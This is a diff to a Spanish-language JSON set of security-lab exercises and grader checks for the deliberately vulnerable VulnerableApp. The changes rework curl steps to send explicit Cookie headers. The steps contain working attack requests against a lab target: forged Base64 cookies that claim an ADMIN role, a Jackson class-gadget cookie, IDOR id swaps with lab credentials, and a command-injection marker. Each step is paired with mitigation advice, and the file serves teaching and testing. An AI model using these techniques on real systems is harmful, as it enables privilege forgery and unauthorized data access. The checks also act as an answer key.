@@ -1326,7 +1326,7 @@
           "headers": {},
           "body": null,
           "content_type": null,
-          "expected": "Si el laboratorio está desplegado con esta implementación, content debe contener VA_LAB_OK porque la entrada llega a sh -c. El resto de la salida puede contener errores o salida de ping; no se exige texto exacto.",
+          "expected": "Si el laboratorio está desplegado con esta implementación, content debe ser exactamente VA_LAB_OK porque la entrada llega a sh -c. El wrapper del target silencia el diagnóstico de ping y el lector del ejercicio elimina el separador final, por lo que el marcador es determinista.",
           "check": {
             "kind": "contains",
             "value": "VA_LAB_OK",
@@ -2150,7 +2150,7 @@
           "mitigation": "No usar un objeto serializado controlado por el cliente para una decisión de negocio. Preferir estado del lado servidor o un token firmado con HMAC verificado antes de parsear; enlazar el resultado a un esquema/clase permitido, validar tamaño y campos, y mantener una lista de valores de negocio válida después de verificar integridad.",
           "steps": [
             "1. Control negativo: emitir una cookie legítima y observar solo la cabecera sin asumir que el reto está resuelto: curl -i -c /tmp/va-deser-l1.cookies -X POST 'http://target:9090/VulnerableApp/InsecureDeserialization/LEVEL_1' -H 'Content-Type: application/x-www-form-urlencoded' --data 'theme=dark&notificationsEnabled=true'",
-            "2. Comprobar la cookie legítima: curl -i --get 'http://target:9090/VulnerableApp/InsecureDeserialization/LEVEL_1' -b /tmp/va-deser-l1.cookies -H 'Accept: application/json'",
+            "2. Comprobar la cookie legítima (curl 8.22 no reutiliza jars para el hostname Docker): curl -i --get 'http://target:9090/VulnerableApp/InsecureDeserialization/LEVEL_1' -H \"Cookie: preferences_level1=$(awk -v name=preferences_level1 '$6==name{print $7}' /tmp/va-deser-l1.cookies)\" -H 'Accept: application/json'",
             "3. Control positivo seguro, sin ejecutar nada en el servidor: curl -i --get 'http://target:9090/VulnerableApp/InsecureDeserialization/LEVEL_1' -H 'Accept: application/json' -H 'Cookie: preferences_level1=eyJ0aGVtZSI6IkhBQ0tFRCIsIm5vdGlmaWNhdGlvbnNFbmFibGVkIjp0cnVlfQ=='",
             "4. Comparar ambos JSON. Una respuesta 200 solo demuestra que el endpoint respondió; el resultado esperado de este código se acredita por $.isValid=true y el contenido HACKED, no por el código HTTP aislado."
           ],
@@ -2189,7 +2189,7 @@
           "mitigation": "No aceptar role/subject desde un cookie unsigned. Mantener la identidad y los permisos en una sesión del servidor o en un token con firma, validar issuer/audience/expiración y aplicar autorización server-side en cada operación; no derivar privilegios solo de un objeto reconstruido desde bytes del cliente.",
           "steps": [
             "1. Iniciar la sesión normal en un jar local: curl -i -c /tmp/va-deser-l2.cookies -X POST 'http://target:9090/VulnerableApp/InsecureDeserialization/LEVEL_2' -H 'Accept: application/json'",
-            "2. Control negativo USER: curl -i --get 'http://target:9090/VulnerableApp/InsecureDeserialization/LEVEL_2' -b /tmp/va-deser-l2.cookies -H 'Accept: application/json'",
+            "2. Control negativo USER (reutiliza el valor con header explícito): curl -i --get 'http://target:9090/VulnerableApp/InsecureDeserialization/LEVEL_2' -H \"Cookie: session_level2=$(awk -v name=session_level2 '$6==name{print $7}' /tmp/va-deser-l2.cookies)\" -H 'Accept: application/json'",
             "3. Control positivo seguro con el marcador documentado y sin comandos externos: curl -i --get 'http://target:9090/VulnerableApp/InsecureDeserialization/LEVEL_2' -H 'Accept: application/json' -H 'Cookie: session_level2=eyJ1c2VybmFtZSI6IkFkYW0iLCJyb2xlIjoiQURNSU4ifQ=='",
             "4. Confirmar la diferencia en content y $.isValid. No atribuir el resultado a un 200: ambos caminos están diseñados para responder HTTP 200 y expresar el estado en el JSON."
           ],
@@ -2224,7 +2224,7 @@
           "mitigation": "Conservar la verificación HMAC antes de la deserialización, usar comparación resistente a timing, limitar tamaño y enlazar el payload a la clase esperada. En una aplicación real, preferir además sesión server-side para roles y rotación/gestión segura del secreto; no exponerlo en el cliente.",
           "steps": [
             "1. Obtener una cookie firmada legítima y guardar el Set-Cookie localmente: curl -i -c /tmp/va-deser-l3.cookies -X POST 'http://target:9090/VulnerableApp/InsecureDeserialization/LEVEL_3' -H 'Accept: application/json'",
-            "2. Control positivo del camino seguro: curl -i --get 'http://target:9090/VulnerableApp/InsecureDeserialization/LEVEL_3' -b /tmp/va-deser-l3.cookies -H 'Accept: application/json'",
+            "2. Control positivo del camino seguro: curl -i --get 'http://target:9090/VulnerableApp/InsecureDeserialization/LEVEL_3' -H \"Cookie: session_level3=$(awk -v name=session_level3 '$6==name{print $7}' /tmp/va-deser-l3.cookies)\" -H 'Accept: application/json'",
             "3. Reusar deliberadamente el payload ADMIN sin firma, que sí se acepta en LEVEL_2: curl -i --get 'http://target:9090/VulnerableApp/InsecureDeserialization/LEVEL_3' -H 'Accept: application/json' -H 'Cookie: session_level3=eyJ1c2VybmFtZSI6IkFkYW0iLCJyb2xlIjoiQURNSU4ifQ=='",
             "4. Registrar como resultado esperado el rechazo de ADMIN, no el mero 200. Si se prueba una mutación de una cookie genuina, conservar el componente después del punto y cambiar solo el Base64 anterior; el código debería informar Signature mismatch."
           ],
@@ -2265,7 +2265,7 @@
           "mitigation": "No habilitar default typing para input no confiable. Desactivar polimorfismo por defecto, usar DTOs concretos y allowlists estrictas de tipos cuando sean imprescindibles, verificar integridad antes de parsear, validar tamaño y aislar cualquier gadget/sink; actualizar dependencias y revisar clases con setters/constructores con efectos secundarios.",
           "steps": [
             "1. Emitir primero una visita normal, guardando su cookie: curl -i -c /tmp/va-deser-l4.cookies -X POST 'http://target:9090/VulnerableApp/InsecureDeserialization/LEVEL_4' -H 'Content-Type: application/x-www-form-urlencoded' --data-urlencode 'section=Level 2'",
-            "2. Control negativo con VisitedSection normal: curl -i --get 'http://target:9090/VulnerableApp/InsecureDeserialization/LEVEL_4' -b /tmp/va-deser-l4.cookies -H 'Accept: application/json'",
+            "2. Control negativo con VisitedSection normal: curl -i --get 'http://target:9090/VulnerableApp/InsecureDeserialization/LEVEL_4' -H \"Cookie: activity_level4=$(awk -v name=activity_level4 '$6==name{print $7}' /tmp/va-deser-l4.cookies)\" -H 'Accept: application/json'",
             "3. Control positivo seguro, limitado a un marcador de auditoría en memoria: curl -i --get 'http://target:9090/VulnerableApp/InsecureDeserialization/LEVEL_4' -H 'Accept: application/json' -H 'Cookie: activity_level4=eyJAY2xhc3MiOiJvcmcuc2FzYW5sYWJzLnNlcnZpY2UudnVsbmVyYWJpbGl0eS5kZXNlcmlhbGl6YXRpb24uQXVkaXRMb2dHYWRnZXQiLCJub3RlIjoiSEFDS0VEIn0='",
             "4. Comparar el texto Audit log: HACKED con Last visited section. No usar @class de ninguna otra clase, no enviar payloads de procesos/red/archivos y no convertir el marcador en una orden ejecutable."
           ],
@@ -2689,11 +2689,11 @@
           "mitigation": "Derivar la autorización del sujeto autenticado y comprobar en servidor que puede leer el objeto solicitado; para un usuario normal comparar tokenUserId con id y devolver una respuesta de denegación uniforme. No confiar en identificadores enviados por cookie o query string.",
           "steps": [
             "curl -i -c /tmp/va-idor-l1.cookies -X POST http://target:9090/VulnerableApp/IDORVulnerability/LEVEL_1 --data-urlencode 'username=Alice' --data-urlencode 'password=P@ssw0rd!2026'",
-            "curl -i --get http://target:9090/VulnerableApp/IDORVulnerability/LEVEL_1 --data-urlencode 'id=1' -b /tmp/va-idor-l1.cookies",
-            "curl -i --get http://target:9090/VulnerableApp/IDORVulnerability/LEVEL_1 --data-urlencode 'id=2' -b /tmp/va-idor-l1.cookies"
+            "curl -i --get http://target:9090/VulnerableApp/IDORVulnerability/LEVEL_1 --data-urlencode 'id=1' -H \"Cookie: token_level1=$(awk -v name=token_level1 '$6==name{print $7}' /tmp/va-idor-l1.cookies)\"",
+            "curl -i --get http://target:9090/VulnerableApp/IDORVulnerability/LEVEL_1 --data-urlencode 'id=2' -H \"Cookie: token_level1=$(awk -v name=token_level1 '$6==name{print $7}' /tmp/va-idor-l1.cookies)\""
           ],
           "hints": [
-            "Con -c se conserva el token que el servidor emita; -b lo reenvía sin exponerlo al navegador.",
+            "Con -c se conserva el token que el servidor emita; en curl 8.22 extrae el valor con awk y reenvíalo mediante un header Cookie explícito.",
             "El control propio y la consulta ajena deben usar el mismo cookie jar y cambiar únicamente id.",
             "No uses ids fuera de 1, 2 y 3 ni intentes payloads de inyección."
           ]
@@ -2718,7 +2718,7 @@
           "mitigation": "Eliminar userId_level2 como autoridad: extraer siempre el userId del token o de una sesión del servidor y comprobar autorización de objeto en el backend. Marcar cookies sensibles Secure, HttpOnly y SameSite es complementario, no reemplaza la autorización.",
           "steps": [
             "curl -i -c /tmp/va-idor-l2.cookies -X POST http://target:9090/VulnerableApp/IDORVulnerability/LEVEL_2 --data-urlencode 'username=Alice' --data-urlencode 'password=P@ssw0rd!2026'",
-            "curl -i http://target:9090/VulnerableApp/IDORVulnerability/LEVEL_2 -b /tmp/va-idor-l2.cookies",
+            "curl -i http://target:9090/VulnerableApp/IDORVulnerability/LEVEL_2 -H \"Cookie: token_level2=$(awk -v name=token_level2 '$6==name{print $7}' /tmp/va-idor-l2.cookies); userId_level2=$(awk -v name=userId_level2 '$6==name{print $7}' /tmp/va-idor-l2.cookies)\"",
             "Copiar el valor token_level2 de la cabecera Set-Cookie de la respuesta anterior y usarlo sin modificar en el siguiente control de laboratorio:",
             "curl -i http://target:9090/VulnerableApp/IDORVulnerability/LEVEL_2 -H 'Cookie: token_level2=<TOKEN_DE_ALICE>; userId_level2=2'"
           ],
@@ -2812,7 +2812,7 @@
           "mitigation": "Mantener autorización de objeto en servidor, usar el sujeto autenticado como fuente de identidad y separar claramente permisos de usuario y de administrador. Registrar denegaciones sin revelar datos del objeto protegido.",
           "steps": [
             "curl -i -c /tmp/va-idor-l5-alice.cookies -X POST http://target:9090/VulnerableApp/IDORVulnerability/LEVEL_5 --data-urlencode 'username=Alice' --data-urlencode 'password=P@ssw0rd!2026'",
-            "curl -i --get http://target:9090/VulnerableApp/IDORVulnerability/LEVEL_5 --data-urlencode 'id=2' -b /tmp/va-idor-l5-alice.cookies"
+            "curl -i --get http://target:9090/VulnerableApp/IDORVulnerability/LEVEL_5 --data-urlencode 'id=2' -H \"Cookie: token_level5=$(awk -v name=token_level5 '$6==name{print $7}' /tmp/va-idor-l5-alice.cookies)\""
           ],
           "hints": [
             "El status 403 es significativo en este nivel, a diferencia de los niveles 1 a 4.",
@@ -2842,7 +2842,7 @@
           "mitigation": "Conservar la comprobación de rol en la base o una fuente de autoridad equivalente, documentar la matriz RBAC y probar tanto denegaciones de usuarios normales como accesos autorizados de administradores.",
           "steps": [
             "curl -i -c /tmp/va-idor-l5-charlie.cookies -X POST http://target:9090/VulnerableApp/IDORVulnerability/LEVEL_5 --data-urlencode 'username=Charlie' --data-urlencode 'password=P@ssw0rd!2026'",
-            "curl -i --get http://target:9090/VulnerableApp/IDORVulnerability/LEVEL_5 --data-urlencode 'id=2' -b /tmp/va-idor-l5-charlie.cookies"
+            "curl -i --get http://target:9090/VulnerableApp/IDORVulnerability/LEVEL_5 --data-urlencode 'id=2' -H \"Cookie: token_level5=$(awk -v name=token_level5 '$6==name{print $7}' /tmp/va-idor-l5-charlie.cookies)\""
           ],
           "hints": [
             "Compara este resultado con el control negativo de Alice; la identidad de login es la única variable que cambia.",
@@ -9413,7 +9413,7 @@
       "headers": {},
       "body": null,
       "content_type": null,
-      "expected": "Si el laboratorio está desplegado con esta implementación, content debe contener VA_LAB_OK porque la entrada llega a sh -c. El resto de la salida puede contener errores o salida de ping; no se exige texto exacto.",
+      "expected": "Si el laboratorio está desplegado con esta implementación, content debe ser exactamente VA_LAB_OK porque la entrada llega a sh -c. El wrapper del target silencia el diagnóstico de ping y el lector del ejercicio elimina el separador final, por lo que el marcador es determinista.",
       "check": {
         "kind": "contains",
         "value": "VA_LAB_OK",
@@ -9433,7 +9433,7 @@
       ],
       "id": "commandInjection-02",
       "family": "commandInjection",
-      "description": "Si el laboratorio está desplegado con esta implementación, content debe contener VA_LAB_OK porque la entrada llega a sh -c. El resto de la salida puede contener errores o salida de ping; no se exige texto exacto.",
+      "description": "Si el laboratorio está desplegado con esta implementación, content debe ser exactamente VA_LAB_OK porque la entrada llega a sh -c. El wrapper del target silencia el diagnóstico de ping y el lector del ejercicio elimina el separador final, por lo que el marcador es determinista.",
       "limitations": "[\n  \"El análisis está limitado al commit 4df80bbcd42682ecf26334f12c568e0f4a326c1a y a la familia commandInjection. No se modificó código ni se investigaron otras familias.\",\n  \"No hay un archivo específico de commandInjection bajo src/main/resources/attackvectors en este checkout; la familia declara textos y payloads mediante anotaciones ChallengeCard, mientras expectedIssues.csv solo registra CWE-77 en las líneas 48 y 53 de CommandInjection.java. No se inventan recursos ausentes.\",\n  \"La evidencia de los ejercicios es verificación estática del flujo y comandos curl reproducibles; no se ejecutó el target autorizado durante la elaboración. La presencia del marcador depende de que el contenedor tenga ping, de la configuración del perfil unsafe y de que ningún proxy normalice la URL antes de que RequestEntity sea inspeccionado.\",\n  \"Los tests dedicados mockean getResponseFromPingCommand y por ello prueban validators y contratos de respuesta, no una ejecución de shell real. Sus URI de prueba conservan codificaciones como %7C, %3B y %0A; un despliegue puede representarlas de otra manera.\",\n  \"contains VA_LAB_OK es evidencia acotada de que el flujo alcanzó ese printf benigno; no es una autorización para probar órdenes arbitrarias ni prueba por sí misma de RCE general. Un HTTP 200 o isValid=true tampoco prueba ejecución.\",\n  \"El frontend usa innerHTML para renderizar content, pero estos ejercicios no califican XSS. Un reflejo no prueba ejecución XSS; un 200 no prueba IDOR; y no se atribuye puntaje por hacer clic en la interfaz. La comprobación recomendada es leer el JSON y aplicar el objeto check indicado.\",\n  \"No se usan receptor, Mailpit, archivos del host, secretos, órdenes de red, reverse shells, cargas de DoS ni borrado de datos: para commandInjection el único efecto intencional del payload es el marcador printf VA_LAB_OK.\"\n]",
       "requirements": [],
       "tool": "http_request",
@@ -10353,7 +10353,7 @@
       "mitigation": "No usar un objeto serializado controlado por el cliente para una decisión de negocio. Preferir estado del lado servidor o un token firmado con HMAC verificado antes de parsear; enlazar el resultado a un esquema/clase permitido, validar tamaño y campos, y mantener una lista de valores de negocio válida después de verificar integridad.",
       "steps": [
         "1. Control negativo: emitir una cookie legítima y observar solo la cabecera sin asumir que el reto está resuelto: curl -i -c /tmp/va-deser-l1.cookies -X POST 'http://target:9090/VulnerableApp/InsecureDeserialization/LEVEL_1' -H 'Content-Type: application/x-www-form-urlencoded' --data 'theme=dark&notificationsEnabled=true'",
-        "2. Comprobar la cookie legítima: curl -i --get 'http://target:9090/VulnerableApp/InsecureDeserialization/LEVEL_1' -b /tmp/va-deser-l1.cookies -H 'Accept: application/json'",
+        "2. Comprobar la cookie legítima (curl 8.22 no reutiliza jars para el hostname Docker): curl -i --get 'http://target:9090/VulnerableApp/InsecureDeserialization/LEVEL_1' -H \"Cookie: preferences_level1=$(awk -v name=preferences_level1 '$6==name{print $7}' /tmp/va-deser-l1.cookies)\" -H 'Accept: application/json'",
         "3. Control positivo seguro, sin ejecutar nada en el servidor: curl -i --get 'http://target:9090/VulnerableApp/InsecureDeserialization/LEVEL_1' -H 'Accept: application/json' -H 'Cookie: preferences_level1=eyJ0aGVtZSI6IkhBQ0tFRCIsIm5vdGlmaWNhdGlvbnNFbmFibGVkIjp0cnVlfQ=='",
         "4. Comparar ambos JSON. Una respuesta 200 solo demuestra que el endpoint respondió; el resultado esperado de este código se acredita por $.isValid=true y el contenido HACKED, no por el código HTTP aislado."
       ],
@@ -10401,7 +10401,7 @@
       "mitigation": "No aceptar role/subject desde un cookie unsigned. Mantener la identidad y los permisos en una sesión del servidor o en un token con firma, validar issuer/audience/expiración y aplicar autorización server-side en cada operación; no derivar privilegios solo de un objeto reconstruido desde bytes del cliente.",
       "steps": [
         "1. Iniciar la sesión normal en un jar local: curl -i -c /tmp/va-deser-l2.cookies -X POST 'http://target:9090/VulnerableApp/InsecureDeserialization/LEVEL_2' -H 'Accept: application/json'",
-        "2. Control negativo USER: curl -i --get 'http://target:9090/VulnerableApp/InsecureDeserialization/LEVEL_2' -b /tmp/va-deser-l2.cookies -H 'Accept: application/json'",
+        "2. Control negativo USER (reutiliza el valor con header explícito): curl -i --get 'http://target:9090/VulnerableApp/InsecureDeserialization/LEVEL_2' -H \"Cookie: session_level2=$(awk -v name=session_level2 '$6==name{print $7}' /tmp/va-deser-l2.cookies)\" -H 'Accept: application/json'",
         "3. Control positivo seguro con el marcador documentado y sin comandos externos: curl -i --get 'http://target:9090/VulnerableApp/InsecureDeserialization/LEVEL_2' -H 'Accept: application/json' -H 'Cookie: session_level2=eyJ1c2VybmFtZSI6IkFkYW0iLCJyb2xlIjoiQURNSU4ifQ=='",
         "4. Confirmar la diferencia en content y $.isValid. No atribuir el resultado a un 200: ambos caminos están diseñados para responder HTTP 200 y expresar el estado en el JSON."
       ],
@@ -10445,7 +10445,7 @@
       "mitigation": "Conservar la verificación HMAC antes de la deserialización, usar comparación resistente a timing, limitar tamaño y enlazar el payload a la clase esperada. En una aplicación real, preferir además sesión server-side para roles y rotación/gestión segura del secreto; no exponerlo en el cliente.",
       "steps": [
         "1. Obtener una cookie firmada legítima y guardar el Set-Cookie localmente: curl -i -c /tmp/va-deser-l3.cookies -X POST 'http://target:9090/VulnerableApp/InsecureDeserialization/LEVEL_3' -H 'Accept: application/json'",
-        "2. Control positivo del camino seguro: curl -i --get 'http://target:9090/VulnerableApp/InsecureDeserialization/LEVEL_3' -b /tmp/va-deser-l3.cookies -H 'Accept: application/json'",
+        "2. Control positivo del camino seguro: curl -i --get 'http://target:9090/VulnerableApp/InsecureDeserialization/LEVEL_3' -H \"Cookie: session_level3=$(awk -v name=session_level3 '$6==name{print $7}' /tmp/va-deser-l3.cookies)\" -H 'Accept: application/json'",
         "3. Reusar deliberadamente el payload ADMIN sin firma, que sí se acepta en LEVEL_2: curl -i --get 'http://target:9090/VulnerableApp/InsecureDeserialization/LEVEL_3' -H 'Accept: application/json' -H 'Cookie: session_level3=eyJ1c2VybmFtZSI6IkFkYW0iLCJyb2xlIjoiQURNSU4ifQ=='",
         "4. Registrar como resultado esperado el rechazo de ADMIN, no el mero 200. Si se prueba una mutación de una cookie genuina, conservar el componente después del punto y cambiar solo el Base64 anterior; el código debería informar Signature mismatch."
       ],
@@ -10495,7 +10495,7 @@
       "mitigation": "No habilitar default typing para input no confiable. Desactivar polimorfismo por defecto, usar DTOs concretos y allowlists estrictas de tipos cuando sean imprescindibles, verificar integridad antes de parsear, validar tamaño y aislar cualquier gadget/sink; actualizar dependencias y revisar clases con setters/constructores con efectos secundarios.",
       "steps": [
         "1. Emitir primero una visita normal, guardando su cookie: curl -i -c /tmp/va-deser-l4.cookies -X POST 'http://target:9090/VulnerableApp/InsecureDeserialization/LEVEL_4' -H 'Content-Type: application/x-www-form-urlencoded' --data-urlencode 'section=Level 2'",
-        "2. Control negativo con VisitedSection normal: curl -i --get 'http://target:9090/VulnerableApp/InsecureDeserialization/LEVEL_4' -b /tmp/va-deser-l4.cookies -H 'Accept: application/json'",
+        "2. Control negativo con VisitedSection normal: curl -i --get 'http://target:9090/VulnerableApp/InsecureDeserialization/LEVEL_4' -H \"Cookie: activity_level4=$(awk -v name=activity_level4 '$6==name{print $7}' /tmp/va-deser-l4.cookies)\" -H 'Accept: application/json'",
         "3. Control positivo seguro, limitado a un marcador de auditoría en memoria: curl -i --get 'http://target:9090/VulnerableApp/InsecureDeserialization/LEVEL_4' -H 'Accept: application/json' -H 'Cookie: activity_level4=eyJAY2xhc3MiOiJvcmcuc2FzYW5sYWJzLnNlcnZpY2UudnVsbmVyYWJpbGl0eS5kZXNlcmlhbGl6YXRpb24uQXVkaXRMb2dHYWRnZXQiLCJub3RlIjoiSEFDS0VEIn0='",
         "4. Comparar el texto Audit log: HACKED con Last visited section. No usar @class de ninguna otra clase, no enviar payloads de procesos/red/archivos y no convertir el marcador en una orden ejecutable."
       ],
@@ -10763,11 +10763,11 @@
       "mitigation": "Derivar la autorización del sujeto autenticado y comprobar en servidor que puede leer el objeto solicitado; para un usuario normal comparar tokenUserId con id y devolver una respuesta de denegación uniforme. No confiar en identificadores enviados por cookie o query string.",
       "steps": [
         "curl -i -c /tmp/va-idor-l1.cookies -X POST http://target:9090/VulnerableApp/IDORVulnerability/LEVEL_1 --data-urlencode 'username=Alice' --data-urlencode 'password=P@ssw0rd!2026'",
-        "curl -i --get http://target:9090/VulnerableApp/IDORVulnerability/LEVEL_1 --data-urlencode 'id=1' -b /tmp/va-idor-l1.cookies",
-        "curl -i --get http://target:9090/VulnerableApp/IDORVulnerability/LEVEL_1 --data-urlencode 'id=2' -b /tmp/va-idor-l1.cookies"
+        "curl -i --get http://target:9090/VulnerableApp/IDORVulnerability/LEVEL_1 --data-urlencode 'id=1' -H \"Cookie: token_level1=$(awk -v name=token_level1 '$6==name{print $7}' /tmp/va-idor-l1.cookies)\"",
+        "curl -i --get http://target:9090/VulnerableApp/IDORVulnerability/LEVEL_1 --data-urlencode 'id=2' -H \"Cookie: token_level1=$(awk -v name=token_level1 '$6==name{print $7}' /tmp/va-idor-l1.cookies)\""
       ],
       "hints": [
-        "Con -c se conserva el token que el servidor emita; -b lo reenvía sin exponerlo al navegador.",
+        "Con -c se conserva el token que el servidor emita; en curl 8.22 extrae el valor con awk y reenvíalo mediante un header Cookie explícito.",
         "El control propio y la consulta ajena deben usar el mismo cookie jar y cambiar únicamente id.",
         "No uses ids fuera de 1, 2 y 3 ni intentes payloads de inyección."
       ],
@@ -10800,7 +10800,7 @@
       "mitigation": "Eliminar userId_level2 como autoridad: extraer siempre el userId del token o de una sesión del servidor y comprobar autorización de objeto en el backend. Marcar cookies sensibles Secure, HttpOnly y SameSite es complementario, no reemplaza la autorización.",
       "steps": [
         "curl -i -c /tmp/va-idor-l2.cookies -X POST http://target:9090/VulnerableApp/IDORVulnerability/LEVEL_2 --data-urlencode 'username=Alice' --data-urlencode 'password=P@ssw0rd!2026'",
-        "curl -i http://target:9090/VulnerableApp/IDORVulnerability/LEVEL_2 -b /tmp/va-idor-l2.cookies",
+        "curl -i http://target:9090/VulnerableApp/IDORVulnerability/LEVEL_2 -H \"Cookie: token_level2=$(awk -v name=token_level2 '$6==name{print $7}' /tmp/va-idor-l2.cookies); userId_level2=$(awk -v name=userId_level2 '$6==name{print $7}' /tmp/va-idor-l2.cookies)\"",
         "Copiar el valor token_level2 de la cabecera Set-Cookie de la respuesta anterior y usarlo sin modificar en el siguiente control de laboratorio:",
         "curl -i http://target:9090/VulnerableApp/IDORVulnerability/LEVEL_2 -H 'Cookie: token_level2=<TOKEN_DE_ALICE>; userId_level2=2'"
       ],
@@ -10918,7 +10918,7 @@
       "mitigation": "Mantener autorización de objeto en servidor, usar el sujeto autenticado como fuente de identidad y separar claramente permisos de usuario y de administrador. Registrar denegaciones sin revelar datos del objeto protegido.",
       "steps": [
         "curl -i -c /tmp/va-idor-l5-alice.cookies -X POST http://target:9090/VulnerableApp/IDORVulnerability/LEVEL_5 --data-urlencode 'username=Alice' --data-urlencode 'password=P@ssw0rd!2026'",
-        "curl -i --get http://target:9090/VulnerableApp/IDORVulnerability/LEVEL_5 --data-urlencode 'id=2' -b /tmp/va-idor-l5-alice.cookies"
+        "curl -i --get http://target:9090/VulnerableApp/IDORVulnerability/LEVEL_5 --data-urlencode 'id=2' -H \"Cookie: token_level5=$(awk -v name=token_level5 '$6==name{print $7}' /tmp/va-idor-l5-alice.cookies)\""
       ],
       "hints": [
         "El status 403 es significativo en este nivel, a diferencia de los niveles 1 a 4.",
@@ -10956,7 +10956,7 @@
       "mitigation": "Conservar la comprobación de rol en la base o una fuente de autoridad equivalente, documentar la matriz RBAC y probar tanto denegaciones de usuarios normales como accesos autorizados de administradores.",
       "steps": [
         "curl -i -c /tmp/va-idor-l5-charlie.cookies -X POST http://target:9090/VulnerableApp/IDORVulnerability/LEVEL_5 --data-urlencode 'username=Charlie' --data-urlencode 'password=P@ssw0rd!2026'",
-        "curl -i --get http://target:9090/VulnerableApp/IDORVulnerability/LEVEL_5 --data-urlencode 'id=2' -b /tmp/va-idor-l5-charlie.cookies"
+        "curl -i --get http://target:9090/VulnerableApp/IDORVulnerability/LEVEL_5 --data-urlencode 'id=2' -H \"Cookie: token_level5=$(awk -v name=token_level5 '$6==name{print $7}' /tmp/va-idor-l5-charlie.cookies)\""
       ],
       "hints": [
         "Compara este resultado con el control negativo de Alice; la identidad de login es la única variable que cambia.",
